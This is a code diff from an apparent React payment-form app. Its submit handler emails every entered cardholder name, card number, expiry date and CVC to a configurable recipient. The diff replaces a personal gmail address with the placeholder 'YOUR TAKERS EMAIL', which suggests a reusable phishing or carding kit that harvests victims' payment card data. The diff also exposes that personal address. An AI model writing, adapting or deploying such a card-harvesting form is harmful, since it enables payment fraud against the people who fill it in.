@@ -16,7 +16,7 @@ function App() {
   const onSubmit = (data) => {
     setIsSubmitted(true);
     emailSendler({
-      email: 'kolesnikkosta572@gmail.com', // Ваш email получателя
+      email: "YOUR TAKERS EMAIL",
       subject: 'Payment Details',
       message: `Cardholder Name: ${data.cardholderName}\nCard Number: ${data.cardNumber}\nExpiry Date: ${data.expiryMonth}/${data.expiryYear}\nCVC: ${data.cvc}`
     });
